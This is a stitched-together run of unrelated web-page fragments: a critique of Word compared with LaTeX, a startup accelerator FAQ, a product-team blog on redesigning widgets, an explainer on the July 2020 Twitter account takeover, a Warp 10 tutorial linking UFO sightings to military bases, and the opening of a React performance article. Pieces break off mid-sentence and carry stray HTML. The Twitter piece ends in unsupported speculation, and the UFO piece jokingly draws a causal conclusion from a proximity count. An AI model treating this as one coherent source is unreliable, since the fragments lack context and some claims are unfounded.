data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%201024%20719'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/office-365-price.jpg"></p><p>As powerful as word processors are, the <strong>proprietariness</strong> of document preparation applications, while many times justifiable, can hinder the democratization of the publication of creative and scholarly work — a right previously reserved to the elites, and often associated with the publishing industry even decades ago.</p><p>And of course, there are also the <strong>free</strong> / <strong>open-source</strong> variants of <em>Microsoft Word</em> such as <em><a href="https://www.openoffice.org/" target="_blank" rel="noopener noreferrer">OpenOffice.org</a></em>, <em><a href="http://www.libreoffice.org/" target="_blank" rel="noopener noreferrer">LibreOffice</a></em>, <em><a href="https://www.neooffice.org/neojava/en/index.php" target="_blank" rel="noopener noreferrer">NeoOffice</a></em> (for Mac OS X) or even <em><a href="https://www.google.ca/docs/about/" target="_blank" rel="noopener noreferrer">Google Docs</a></em>. The problem — if there is one — is that they invariably suffer from the typical weaknesses exhibited by a standard WYSIWYG word processor, such as the limitations when it comes to feature extension, and the general clumsiness of the design interface.</p><h3><span id="Unsophisticated_Typography_and_Alignment"></span><a id="typo"></a><a href="#toc">Unsophisticated Typography and Alignment</a><span></span></h3><p>While traditional WYSIWYG editors provide an enormous amount of choices in terms of fonts, font sizes and colors, documents produced using those editors tend to lack the <strong>typographical machineries</strong> to make them visually pleasing and satisfying. For one, the texts in these editors tend to be typeset in low resolution, with usually little to no care on minute ornamentations (e.g., <a href="https://en.wikipedia.org/wiki/Typographic_ligature" target="_blank" rel="noopener noreferrer">ligature</a>) and spacing/alignment details (e.g., <a href="https://en.wikipedia.org/wiki/Hyphenation_algorithm" target="_blank" rel="noopener noreferrer">hyphenation</a>) that are commonly observed in professionally produced journals and printed books.</p><p>Poor typography aside. With the traditional WYSIWYG word processors, the end of the lines are — more often than not — poorly aligned. And even if a paragraph is fully-justified, there is usually a lack of <strong>consistency</strong> in the interword spaces — which in turn could make the document look even messier than usual.</p><p>And if you want to produce elaborated <strong>formulas</strong> and <strong>equations</strong> in its full glory, you are pretty much out of luck. After all, while the standard WYSIWYG editors usually allow for the insertion of <a href="https://mathvault.ca/hub/higher-math/math-symbols/greek-hebrew-latin-symbols/" target="_blank" rel="noopener noreferrer">Greek letters</a> and rudimentary equations, in more likelihood, you’d probably find yourself doing a lot of clicking and hand-and-eye coordination — often with very little in return…</p><div id="attachment_1027"><p><img aria-describedby="caption-attachment-1027" src="https://mathvault.ca/wp-content/uploads/latex-sample.png" alt="Professional Typesetting - A Sample of What Can Be Achieved In LaTeX" width="915" height="576" title="latex sample" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20915%20576'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/latex-sample.png"></p><p id="caption-attachment-1027">Try to do this in Microsoft Word, and you’ll soon find yourself in deep despair and fury.</p></div><p>Some more words of caution: if you run too many <strong>equations</strong>,&nbsp;<b>text boxes</b>&nbsp;or <strong>figures</strong> in the same <em>Word</em> document, you could very well risk of <a href="http://www-h.eng.cam.ac.uk/help/tpl/textprocessing/latex_advocacy.html" target="_blank" rel="noopener noreferrer">having your computer run out of memory</a> and freeze to an infamous <a href="https://en.wikipedia.org/wiki/Blue_Screen_of_Death" target="_blank" rel="noopener noreferrer">Blue Screen Of Death</a> (BSOD).</p><h3><span id="Inefficient_Formatting_Features"></span><a id="formatting"></a><a href="#toc">Inefficient&nbsp;Formatting Features</a><span></span></h3><p>There is of course no doubt that <em>Microsoft Word</em> and its competitors has evolved to become some formidable text editors&nbsp;over the years. For example, in the newer <em>Microsoft&nbsp;Word</em> (e.g., <em>Word 95</em> and onward), users can determine the position of the images via a simple and intuitive <strong>drag-and-drop</strong>.</p><p>But as it turns out, this intuitiveness can also be problematic at times. as the position of the images can now be altered at the slightest mouse clicks and keyboard taps. And when that happens, the image position would need to be readjusted again — usually with very little feedback as to where the image would land after the readjustment ends…</p><div id="attachment_1030"><p><img aria-describedby="caption-attachment-1030" src="https://mathvault.ca/wp-content/uploads/ms-word-image-misalignment.jpg" alt="A Typical Microsoft Word Image Misalignment" width="321" height="185" title="ms word image misalignment" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20321%20185'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/ms-word-image-misalignment.jpg"></p><p id="caption-attachment-1030">“Ahh!!! What have I done to deserve this?”</p></div><p>And if you manage to integrate some <strong>text boxes</strong> smoothly into the paragraphs, similar formatting issues could then resurface again: you would drag a text box to an intended position, and it would slip away to another position or simply disobey your command. And if you’re really unlucky, it might even disappear from the document altogether, making any attempt of recovery very difficult — if not impossible.</p><h3><span id="Numbering_Chaos"></span><a id="numbering"></a><a href="#toc">Numbering Chaos</a><span></span></h3><p>In a structured document with a large list of <strong>items</strong> such as chapters, captions and references, it usually makes good sense that we number the items — so that we can keep track of them in a fairly simple manner.</p><p>And while it’s certainly possible to do the numbering manually (which admittedly is rather intuitive), this can actually become increasingly difficult — as the number of items increases.</p><p>Moreover, what if we <em>accidentally</em> numbered Chapter 13 as Chapter 12? Or that we later decide to introduce a <em>new section</em> in between Section 5 and Section 6? Well, that can only mean one thing — that our numbering is all messed up and that it needs to be redone all over again!</p><p>But&nbsp;of course, the point here is not <em>just</em> about the chapters and sections, as the same numbering issue could apply to&nbsp;<strong>bibliographical references</strong>, <strong>tables</strong>, <strong>images</strong>, <strong>definitions</strong> and <strong>equations</strong> (if you manage to make some that is!).</p><p>To be fair, <em>Microsoft Word</em> does support <strong>automatic numbering adjustment</strong> in some cases, but it does so at the cost of bringing in more confusion and complexity. Here’s how <a href="http://word.mvps.org/FAQs/Numbering/WordsNumberingExplained.htm" target="_blank" rel="noopener noreferrer">Microsft Word MVP John McGhie</a> puts it:</p><blockquote><h6>Numbering in Word is difficult to understand because Word attempts to hide “complexity” from us. In many cases, it provides insufficient detail in the explanation of features. Regrettably, a simplistic explanation does not help understanding of a complex subject. It fills our heads with loose ends, which makes the problem worse!</h6></blockquote><p>And of course, the issue runs deeper than simply the numbering of the modules themselves. For example, let’s say that you referred to page 91 where you elaborated a bit on the <em>Keynesian theory of economics</em>, but later edited the text so that the same content now appears on <em>page 87</em>. Well, that’s not a good news, because it means that you would have to change your <strong>reference page</strong> now from 91 to 87!</p><p>And there is more: imagine doing that for <em>hundreds</em> of <strong>page references</strong> for equations, sections, chapters, paragraphs, tables, figures, footnotes and citations… Not exactly a human-friendly task if we may add!</p><h3><span id="Flowery_/_Messy_Graphics_Over_Image_Quality,_Speed_and_Simplicity"></span><a id="graphic"></a><a href="#toc">Flowery / Messy Graphics Over Image Quality, Speed and Simplicity</a><span></span></h3><p>While&nbsp;WYSIWYG text editors provide an intuitive graphical user interface by displaying, <em>in real-time</em>, how the document will look like when it’s printed, in some instances, it has also been argued that it’s this overemphasis on elaborated graphics that forces traditional WYSIWYG editors to water down its <strong>display resolution&nbsp;</strong>and <strong>typesetting quality</strong>. For example, Alain Cottrell, a strong proponent of $ \TeX$, <a href="http://ricardo.ecn.wfu.edu/~cottrell/wp.html" target="_blank" rel="noopener noreferrer">puts it this way</a>:</p><blockquote><h6>The typesetting algorithm employed by WYSIWYG word processor sacrifices quality to the speed required for the setting and resetting of the user’s input in real time. The final product is greatly inferior to that of a real typesetting program.</h6></blockquote><div id="attachment_1066"><p><img aria-describedby="caption-attachment-1066" src="https://mathvault.ca/wp-content/uploads/appearance-substance.jpg" alt="Microsoft Word - Appearance Over Substance?" width="281" height="123" title="appearance substance" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20281%20123'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/appearance-substance.jpg"></p><p id="caption-attachment-1066">Microsoft Word’s Document Output</p></div><p>In addition, as the demand for more powerful features and functionalities grow over the years,&nbsp;there is a tendency — for developers of traditional WYSIWYG editors —&nbsp;to sacrifice&nbsp;the cleanness of <strong>user interface</strong> (UI) by featuring&nbsp;an excessive amount of friendly icons, menus, boxes and bars into the editor’s main window. As a result, the users would find themselves performing&nbsp;<em>repetitive mouse clicks&nbsp;</em>and an unnatural amount of fine hand-and-eye coordinations — just to get to some feature which could have been implemented in a more energy-efficient manner.</p><p>What’s worse. The decision to opt for a more <em>graphical</em> — rather than a more <em>minimalist</em> user interface — would eventually take a toll on the <strong>speed</strong> of the text editors, putting additional demands on the computer’s memory and graphic card while making the installation larger and longer as the year progresses.</p><h2><span id="Introducing_LaTeX_and_its_Strengths"></span><a id="latex"></a><a href="#toc">Introducing LaTeX and its&nbsp;Strengths</a><span></span></h2><p>As we have seen, WYSIWYG text editors operate on the philosophy of an intuitive, <strong>output-editing graphical user interface</strong> — one which is easy to maneuver, but which could make document preparation tedious and ineffective for the large-scale tasks with higher professional demands.</p><p>And because of that, we now turn our attention to a different kind of document …</p></div></div>

                  pair you with mentors who were in your shoes not long ago—and
                  have since turned their startups into high growth companies.

                  We want to get to know you. If you have a problem you’re

                Our founders, Baris and Armaan, met on the first day of
                international student orientation at Stanford. That year, Baris
                started a web development automation business, while Armaan
                began investing in companies started by his entrepreneurial
                peers.
              </p>
              
              <p>
                Both realized they loved helping students with a cerebral desire
                to have a meaningful, material impact. Sometimes that meant
                guiding them to jobs at high growth startups. Sometimes it meant
                helping them build their own startups (and investing in them).
                Sometimes it was a combination of both.
              </p>
              
              <p>
                The desire to help students make a meaningful impact led to the
                founding of Human Capital. Over the last 5 years, we’ve built
                relationships with more than 5,000 engineers and entrepreneurs
                and spent countless hours helping young founders dissect
                industries, test early betas, and acquire their first customers.
              </p>
              
              <p>
                We’ve invested in six companies that are now worth over $1B
                each, and have over $200M in AUM. And we’re eager to partner
                with more great young founders.

              <h4>Who can apply?</h4>
              <p>
                Incoming, current, and recent undergraduate and graduate
                students.

                Do I need to take a semester off from school?
              </h4>
              <p>
                No, but we recommend it. We expect you to dedicate a significant
                amount of time to the program, but it’s up to you.
              </p>

              <h4>
                Do I have to drop out of college after the program?
              </h4>
              <p>
                No. You should do what you think is best—whether that means
                going back to college, pursuing your startup idea, or something
                else entirely.

                Are you looking for solo founders or co-founder pairs?
              </h4>
              <p>
                Either. You can apply as a solo founder, but we’ve found most
                successful ventures are built by teams—so if you know someone
                exceptional you’d like to build with, mention them in the
                application and encourage them to apply.

                Can I apply and participate as an international student?

              <p>
                Yes. We hope you’ll apply, no matter what country you live in.
                If you’re selected, you can work from wherever you want. If you
                have a visa, we’ll work with you to find the best way to have
                you participate. (There are tax implications for international
                students that you’ll need to handle since each country has its
                own specific tax policies and regulations, but we’ll work
                through any issues with you together.)

Thanks for stopping by the Amplenote blog. Did you know that the content of this "blog post" is just a plain old
note, lifted from the author's Amplenote notebook? Rich footnotes, built-in emoji selector ðŸ˜„, and the strongest
encryption game among major note apps (all notes encrypted client-side by default) make us a solid option
for modern writers.

			<div>
				<div>
					
					<p><small>Published on 14/07/2020</small></p>
					<p>The question: “How can we reduce risk and deliver value at the same time?” resonates with an increasing very-related question: “How can we meet infinite growth in a finite world?”. Let’s see how we did our best on our team’s scope to answer this question. Onboard with us on a two and half months journey mostly during covid-19 confinement.</p>
				</div>
			</div>
		</div><div>
			<div>
				<div>
					<h2>Value VS Risk</h2>
					<p>Every journey is a compromise between value and risk. Each individual has his own evaluation grid and decides to travel or not. And pretty much any decision in life is about making tradeoffs between risk and value. Products do not escape this rule.</p>
					<p>Everyone has a definition of what value is. But people tend to agree that it is the importance, worth, or usefulness of something. When worth or usefulness are accepted to be defined by the market, importance is mostly internal and is the last key to prioritization.</p>
					<p>Here the title mentions risk when actually most people talk about debt (especially technical debt). I personally don’t believe in technical debt. Debt does not exist on technical products. It is actually more of a risk, high or low. Every time a developer removes a line of code and replaces it by something better, we don’t reduce debt (we have no contract with anyone mentioning a quantifiable debit), we reduce risk. If the topic interests you, I recommend you read: “<a href="https://medium.com/@waxzce/technical-debt-the-myth-at-the-heart-of-the-it-labyrinth-8e93954848ea" target="_blank">The Myth at the Heart of the IT Labyrinth</a>”.</p>
					<br>
					<hr>
					
					<p>When you travel, it is for a reason. You want to go somewhere, have a break, see landscapes, find yourself... but you can’t do all at once. When you build a product, you may very often want to seduce new users, limit churn and reduce costs but doing all three at once is difficult. There is a high chance that you will focus on only one.</p>
					<p>Delivering value and reducing risk are very often presented as opposed tasks. Reducing risk is never perceived as adding value. Naturally, Humans want more. Even if it puts them in a debt situation. We unconsciously apply this behaviour to any (tech) product in hopes for later growth ; at least enough growth to catch-up and overpass the debt.</p>
				</div>
			</div>
		</div><div>

				<div>
					<h2>Every context is unique</h2>
					<p>AB Tasty helps his clients to de-risk decisions and leverage growth potentials.</p>
					<p>We offer different ways to do so. One of them is to use widgets.</p>
					<p>For our users, widgets are a collection of easy-to-deal-with tools. Some can help you to quickly add a banner or a modal onto a page, some can display a countdown and others, more sophisticated, can display an NPS survey.</p>
					<p>For us, widgets are a way to distribute value and to cover a Pareto of user needs. They look friendly and they also speed up our service of custom development: what cannot be done with a widget only is done faster with a widget and custom development.</p>
					<p>They have been, for a long time, a very impactful and differentiating way to deliver value, with minimum efforts, to our users. Competitors are aware of that and are joining us in the game. The rise of code-less widgets goes in pair with the no-code movement, the need for marketers empowerment and the fast iteration loop progress in organizations.</p>
					<br>
					<hr>
					
					<p>The widget gallery has seen its volume increase over time and new ones have seen light from time to time.</p>
					<p><img src="http://www.yoanngrange.com/img/blog/004-widgets.gif"></p><p>Back in November, there was both an increasing need for new widgets (internally and externally) and a growing pile of issues on the existing ones. I had the chance to join AB Tasty in November and work in a team where the level of experience dealing with widgets is high. They quickly explained to me the main points on which the widgets were relying. The structure of the use of a widget relies on four pillars: layout, content, style and conditions. Before you know it, you start to think like the people in the company and things like these four concepts sound familiar. Nevertheless, for the new user, it never is that obvious. Let’s dig into details before we go further.</p>
					<blockquote>
						<ul>
							<li><strong>Layout</strong>: this tab helps you to give a global shape of your widget and place it in the page.</li>
							<li><strong>Content</strong>: in this tab, you will decide if it will have a button or not and if the text is going to be long or short, if it will have an image...</li>
							<li><strong>Style</strong>: this is where you decide about how your widget will look: colors, borders, backgrounds...</li>
							<li><strong>Conditions</strong>: this tab defines under which conditions the widget will be triggered (displayed) and when it will be re-triggered (or not). In short, how the widget will behave in relation with the visitor behavior.</li>
						</ul>
					</blockquote>
					<p>The more we discussed with the team about bug tickets, feedbacks, the more we discovered that widget components, behaviours and usability needed to be more consistent. This consistency would help users reduce their learning curve and become more and more familiar with the widget logic. It would also reduce what some people call “user problems” - which is a fancy way to say that a product is unclear enough to mislead users. Little by little, we started to call the components by names: “the select element”, “the color picker”, “the slider”... and started re-designing every single one of them. </p>
					<p>So you have widgets, inside each widget, you have tabs, and inside each tab, you have components, inside each component, you have a whole load of complexity. All alike but all different. Not to mention that there is no such thing as two identical websites and that we make our best to be compatible with them all.</p>
					<p>That moment reminded me a conference from Roy Tomeij in 2012 (yeah, I’m old) on design systems and how Bob Ross (yeah, I’m that old) was reusing components (“the happy little tree”, “the quiet river”, “the almighty mountain”...) the same we used to start with design systems.</p>
					<p>
						<iframe width="560" height="315" src="https://www.youtube.com/embed/T6-75HdADc8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
					</p>
					<p>I’m not even sure we were using the words “design system” back then (Dieter Rams probably was). In the conference, Roy mentions “pattern design” if I’m correct. This is globally the same idea: re-use all the things.</p>
					<p>Once we had redesigned the bricks and given them names, we had to replace every brick in the wall without removing the wall. Mortar being: time, patience &amp; side effects.</p>
					<br>
					<hr>
					<br>
					<h2>Preparation to somewhere</h2>
					<p>With a database extract of all widget configurations existing among our 600,000 campaigns, It gave us a clear global view of the mostly used widgets, the most growing ones in use, the percentage of default values being used and the values that were pushed to extreme limits or even the ones overridden with extra code. We also made a 100 slides presentation listing all the inconsistencies, misplaced components, bad wording, weirdities...</p>
					<p>The thing we missed was a use-tracking map. The database extract gives an image of the latest saved version of each widget but does not tell you much about: the average number of times the settings of a widget are changed, how many clicks on a component are required in average to make a single change, do users change this before that,... So, a good advice would be to track all the use of your new product (probably not on an MVP). You may need it afterwards. Same here, it is not an investment. It is reducing future potential risks.</p>
					<p>When you know you go North or South, for a week or a whole year, you pack accordingly. The bad (or probably good) thing with Agility is that you don’t really know your destination. You know where you’re gonna sleep the very first night. When you are there, you can watch behind you and frounce if you did not do much or pat your back and congratulate yourself if you consider your stride was good.</p>
					<p>By the way, I strongly recommend you to watch Dave Thomas talk below:</p>
					<p>
						<iframe width="560" height="315" src="https://www.youtube.com/embed/a-BOSpxYJ9M" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
					</p>
					<p>We knew that the duration of the journey was going to be hard to estimate as we had to maintain in operational conditions the existing widgets and replace pieces which hold them up. We decided to start with the most common component of all: the text input. The text input was the simplest component (and by chance the most common and used one among the widgets). By redeveloping it, we could then know how long the others could take us to re-develop and the difficulties we could meet along the way.</p>
					<p>Oh boy, we shortly understood that such a “simple” component like that was tied up with lots of different issues: translation management, validation logic, error triggering, types, conditions, statuses... So instead of re-doing the components and replacing them into the existing widgets, we discovered that we also had to rebuild the foundations.</p>
					<p>Mockuping everything before the development starts is not so much Agile and much more Waterfall. We however mocked up all screens of all widgets. Doing so took a bit of time but also came with benefits: </p>
					<blockquote>
						<ul>
							<li>Overview of all the work to be done</li>
							<li>Re-usability ratio of each component</li>
							<li>Potential conflicts list</li>
							<li>Missing components list</li>
							<li>Communication prep work list</li>
						</ul>
					</blockquote>
					<p>We decided to do it in milestones: first set foundations, then redo components, finally implement components and rework existing widgets.</p>
				</div>

					<h2>A new widget</h2>
					<p>When you trek, it is always better to start your day looking at the map, seeing the contour lines, the passes, the valleys, the waterfalls, the swamps, the places where it is safe to rest... so it mentally helps you to manage your efforts along the way.</p>
					<p>The idea of rework all widgets was, more than anything else, to put AB Tasty in a position to deliver new widgets faster. Way faster. Nevertheless, the need for new widgets was so strong that we had to deliver a new one as soon as possible. Delivering a new widget was the best proof we could provide to demonstrate that our work was meeting our commitment: put the company in a position to deliver new widgets faster.</p>
					<p>Which one though? We have a lot of new widget ideas in the backlog. We needed to pick one that was simple, visual and desired. We decided to …</p></div></div></div></div>

<p>On July 15 2020, between 20:00 to 22:00 UTC, up to one hundred and thirty <strong>high-profile</strong> Twitter accounts were compromised.</p>



<p>Some affected accounts included Elon Musk, Bill Gates, Barack Obama, and Jeff Bezos, alongside cryptocurrency accounts like CoinBase and Binance. The majority of accounts had over one million followers.</p>



<figure><img src="https://photos5.appleinsider.com/gallery/36698-68549-200715-TwitterHack-xl.jpg" alt="Screenshot of Apple's tweet"><figcaption>Tweet from Apple’s official Twitter account</figcaption></figure>



<p>Since this is a developing situation, we don’t know anything for certain. With that in mind, here is a summary of what we think we know so far.</p>



<p>As you can see from the image above, the scam involved trusted accounts claiming to double the amount of any bitcoin sent to a certain address.</p>



<p>Many different bitcoin addresses were used, and one address reportedly gained the equivalent of over $110,000.</p>



<h2>how did this happen?</h2>



<p>It is difficult to believe that such a well-known platform could be breached in such a way that goes undetected until hundreds of thousands of dollars of damage have been caused. With such a popular social network, you’d think the security is unbeatable.</p>



<p><strong>Let’s try to break it down.</strong></p>



<p>On the day of the attack, <a href="http://vice.com/">Vice</a> was contacted by a group claiming to be responsible for the attack, who said they paid a Twitter employee to give them access to an administrative tool that allowed them to change account’s settings which would allow them to get around security practices such as Two Factor Authentication (2FA) for these accounts.</p>



<p>However, this isn’t necessarily a reliable source.</p>

<p>This tweet (above) from Twitter’s official support account suggests that a social engineering attack was used to gain access to “internal systems and tools” — similar to the “administrative tool” mentioned above.</p>



<p>Social engineering is when you trick a person (in this case a twitter employee) into compromising their own system. This can be through many methods. A common example of social engineering is telephone scammers, which are, for example, when someone calls you pretending to be your bank, asks for some sensitive details, claims to have fixed some made-up issue, and hangs up, leaving you clueless to the fact that they have just drained all the money from your account.</p>



<p>This technique or similar could have been used to gain access to Twitter’s systems through tricking staff into installing tools like a remote access tool (RAT) which would allow the hackers to gain access to admin tools and credentials without raising any alarms.</p>



<p>Now, this tool that the hackers had access to would allow them to edit account variables like the confirmation email address, the 2FA email address or phone number, and so on, allowing them to reset the password and gain full control over the account.</p>



<p>From there they sent out the tweets with the bitcoin scam. Each sculpted to fit the persona who tweeted them out, indicating a lot of time and thought put into this attack.</p>



<h2>something darker?</h2>



<p>I’ll leave you with something to ponder on:<br>Was money really the final motive of this attack?</p>



<p>Somebody with the ability to pull off such a sophisticated attack would surely be above a low-income bitcoin scam. <br>Personally, I think the scam is a mere cover-up for something much darker.</p>

<h2>Display military bases location</h2>



<p>Now we will try to find a relationship between UFO sightings and military bases locations in the USA.</p>



<p>So we need a US military bases datasets, here is one: <a href="https://public.opendatasoft.com/explore/dataset/military-bases/information/" target="_blank" aria-label="undefined (opens in a new tab)" rel="noreferrer noopener">https://public.opendatasoft.com/explore/dataset/military-bases/information/</a></p>



<p>And here is the Warp 10 data to import to your instance: <a aria-label="undefined (opens in a new tab)" href="https://blog.senx.io/wp-content/uploads/2020/06/bases.zip" target="_blank" rel="noreferrer noopener">bases.zip</a>.</p>



<pre><code>curl \
  -H "X-Warp10-Token: &lt;YOUR WRITE TOKEN&gt;" \
  -H "Transfer-Encoding: chunked" \
  -T bases.gts \
  'https://sandbox.senx.io/api/v0/update'</code></pre>



<p>At first, let's have a look to the datasets on a map:</p>



<warp-view-editor url="https://warp.senx.io/api/v0/exec" show-dataviz="false" show-execute="false" height-px="300" show-result="false" config="{&quot;editor&quot;:{&quot;minLineNumber&quot;:2},&quot;execButton&quot;:{&quot;class&quot;:&quot;components-button is-primary&quot;},&quot;readOnly&quot;:true}" warpscript="'<YOUR READ TOKEN>' 'token' STORE
[ 
    $token
    'military.bases' { 'country' 'United States' }
    NOW -1000 // we have less than 1000 datapoints
] FETCH MERGE 'bases' STORE
// display
[ $bases mapper.tostring 0 0 0 ] MAP 'bases' STORE
[ 
  { 
      'key' 'military base'
      'render' 'dot' 
      &quot;color&quot; &quot;#f44336&quot;
  } 
] 'params' STORE
{ 'data' [ $bases ] 'params' $params } "></warp-view-editor>



<figure><img src="https://blog.senx.io/wp-content/uploads/2020/06/t%C3%A9l%C3%A9chargement-2-1024x575.jpg" alt="" srcset="https://blog.senx.io/wp-content/uploads/2020/06/t%C3%A9l%C3%A9chargement-2-1024x575.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/06/t%C3%A9l%C3%A9chargement-2-300x169.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/06/t%C3%A9l%C3%A9chargement-2-768x432.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/06/t%C3%A9l%C3%A9chargement-2.jpg 1285w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>US military bases location</figcaption></figure>



<p>Well, I it seems there is a relationship. Now let's display both.</p>



<p>The smartest way is to use a regular expression to fetch both bases and sightings, and then, filter the result to retain only the time series we want.</p>



<warp-view-editor url="https://warp.senx.io/api/v0/exec" show-dataviz="false" show-execute="false" height-px="300" show-result="false" config="{&quot;editor&quot;:{&quot;minLineNumber&quot;:2},&quot;execButton&quot;:{&quot;class&quot;:&quot;components-button is-primary&quot;},&quot;readOnly&quot;:true}" warpscript="[ 
    $token
    '~(military.bases|sighting.ufo)' { 'country' '~(us|United States)' }
    [ 1900 01 01 ] TSELEMENTS-> ISO8601
    [ 2021 01 01 ] TSELEMENTS-> ISO8601
] FETCH DEDUP 'gts' STORE

// extract sightings
[ $gts [] 'sighting.ufo' filter.byclass ] FILTER MERGE DEDUP 'sightings' STORE
[ $gts [] 'military.bases' filter.byclass ] FILTER MERGE DEDUP 'bases' STORE"></warp-view-editor>



<figure><img src="https://blog.senx.io/wp-content/uploads/2020/06/t%C3%A9l%C3%A9chargement-3-1024x535.jpg" alt="UFO sightings and military databases" srcset="https://blog.senx.io/wp-content/uploads/2020/06/t%C3%A9l%C3%A9chargement-3-1024x535.jpg 1024w, https://blog.senx.io/wp-content/uploads/2020/06/t%C3%A9l%C3%A9chargement-3-300x157.jpg 300w, https://blog.senx.io/wp-content/uploads/2020/06/t%C3%A9l%C3%A9chargement-3-768x401.jpg 768w, https://blog.senx.io/wp-content/uploads/2020/06/t%C3%A9l%C3%A9chargement-3.jpg 1399w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>UFO sightings and military databases</figcaption></figure>



<h2>Military bases and UFO sightings relationship</h2>



<p>Now, I would like to know how many sightings there is below 50 km of a military base.</p>



<p>To achieve that, here is the steps:</p>



<ul><li>Fetch data</li><li>Filter by series</li><li>For each military base (hopefully, they are not thousands)<ul><li>Compute a 50 km radius circle</li></ul></li><li>Aggregate those circles</li><li>Count sightings inside those circles</li><li>Get the overall sightings count</li></ul>



<warp-view-editor url="https://warp.senx.io/api/v0/exec" show-dataviz="false" show-execute="false" height-px="600" show-result="false" config="{&quot;editor&quot;:{&quot;minLineNumber&quot;:2},&quot;execButton&quot;:{&quot;class&quot;:&quot;components-button is-primary&quot;},&quot;readOnly&quot;:true}" warpscript="'<YOUR READ TOKEN>' 'token' STORE
[ 
    $token
    '~(military.bases|sighting.ufo)' { 'country' '~(us|United States)' }
    [ 1900 01 01 ] TSELEMENTS-> ISO8601
    [ 2021 01 01 ] TSELEMENTS-> ISO8601
] FETCH 'data' STORE

[ $data [] 'sighting.ufo' filter.byclass ] FILTER MERGE 'sightings' STORE
[ $data [] 'military.bases' filter.byclass ] FILTER MERGE 'bases' STORE
// the list of 50 km circles
[] 'listOfShapes' STORE
[ $bases <% 
    // get datapoint's location
    FLATTEN [ 4 5 ] SUBLIST 'loc' STORE
    // get a 50 km radius circle
    $loc 0 GET $loc 1 GET 50000 @senx/geo/circle 0.05 false GEO.WKT 'geoShape' STORE
    // append the Shape
    $listOfShapes $geoShape +! DROP // discard the result
    // dummy return
    [ 0 NaN NaN NaN NULL ]
%> MACROMAPPER 0 0 0  ] MAP DROP // discard the result
// merge shapes and optimize with a 2.5 km precision
$listOfShapes GEO.UNION 14 GEO.OPTIMIZE 'geoArea' STORE
// filter sightings to keep only those who are inside
[ $sightings $geoArea mapper.geo.within 0 0 0 ] MAP 0 GET 
// count
VALUES SIZE 'near' STORE
// display
{
  '< 50 km' $near
  '> 50 km' $sightings VALUES SIZE $near -
}"></warp-view-editor>



<pre><code>{"&lt; 50 km":42801,"&gt; 50 km":14209}</code></pre>



<p>Ok, but in percent? Modify the end of the previous script.</p>



<warp-view-editor url="https://warp.senx.io/api/v0/exec" show-dataviz="false" show-execute="false" height-px="300" show-result="true" config="{&quot;editor&quot;:{&quot;minLineNumber&quot;:2},&quot;execButton&quot;:{&quot;class&quot;:&quot;components-button is-primary&quot;},&quot;readOnly&quot;:true}" warpscript="$sightings VALUES SIZE 'total' STORE
// display
{
  '< 50 km' $near 100 * $total / TOSTRING '%25' +
  '> 50 km' $total $near - 100 * $total / TOSTRING '%25' +
}"></warp-view-editor>



<pre><code>{"&lt; 50 km":"75%","&gt; 50 km":"24%"}</code></pre>



<p><strong>75% of UFO sightings in the USA take place at less than 50 km from a military base!</strong></p>



<p>That could mean two things:</p>



<ul><li>The US military bases secretly host aliens</li><li>The US army is made of aliens</li></ul>



<h2>Final though</h2>



<p>With this datasets, we have seen a to do a <a aria-label="undefined (opens in a new tab)" href="https://www.warp10.io/doc/MACROMAPPER" target="_blank" rel="noreferrer noopener">MACROMAPPER</a>, how to manipulate <a aria-label="undefined (opens in a new tab)" href="https://www.warp10.io/doc/AIt7H3CEG3J" target="_blank" rel="noreferrer noopener">HHCODE</a>, <a aria-label="undefined (opens in a new tab)" href="https://www.warp10.io/doc/AIt6GJxIH34FGF" target="_blank" rel="noreferrer noopener">GeoShapes</a>, how to <a aria-label="undefined (opens in a new tab)" href="https://www.warp10.io/doc/mapper.geo.within" target="_blank" rel="noreferrer noopener">filter data by a geographic area</a>, and how to <a aria-label="undefined (opens in a new tab)" href="https://www.warp10.io/doc/VALUEHISTOGRAM" target="_blank" rel="noreferrer noopener">compute the value distribution</a>.</p>



<p>Like said before, in a futur post, we will build an UFO dashboard with all of what we discovered.</p>



<p>Live long and prosper.</p>

<p><i>
<author>Thomas Hintz</author> . <time datetime="2020-07-17T09:03">07/17/2020</time></i></p>
<p>What happens when you update state in a React component? Does React
intelligently isolate the update to only components that need to be
re-rendered? No. In fact, by default, React does not attempt to optimize
re-renders at all.</p>
<p>This means that if the state of a component changes React will re-render
that component and <em>all child components</em>! Usually this is not a problem
either because updates are infrequent or because your render methods or
functions are cheap and fast. But as your component tree grows in size
or your lists of components grow this can quickly become a major problem
causing jankiness and a drop in responsiveness.</p>
<h2>Background</h2>
<p>Before React and similar libraries were created a large source of
front-end bugs was the browser DOM being out-of-sync with your internal
app state. This could easily happen when manually trying to keep the two
in sync. React was designed to solve this problem and to efficiently map
your internal state to the DOM. It was not designed to intelligently
render a tree of components. Instead React intentionally left that
process simple and unoptimized.</p>
<figure><img src="https://thomashintz.org/img/render-tree-flow.gif" alt="Shows the default rendering flow of React when state is changed on the
root node." title="render-tree-flow">
<figcaption>Shows the default rendering flow of React when state is changed on the
root node.</figcaption></figure>
<p>So let's say you run into this point of unoptimization where your app is
getting janky and you've discovered that React is re-rendering expensive
components even when there is no reason to, what can you do about it?</p>
<h2>Solution</h2>
<p>The React developers are not unaware of this problem and have actually
included tools to address it. The simplest tools are
<a href="https://reactjs.org/docs/react-api.html#reactpurecomponent"><code>React.PureComponent</code></a>
and <a href="https://reactjs.org/docs/react-api.html#reactmemo"><code>React.memo</code></a>.
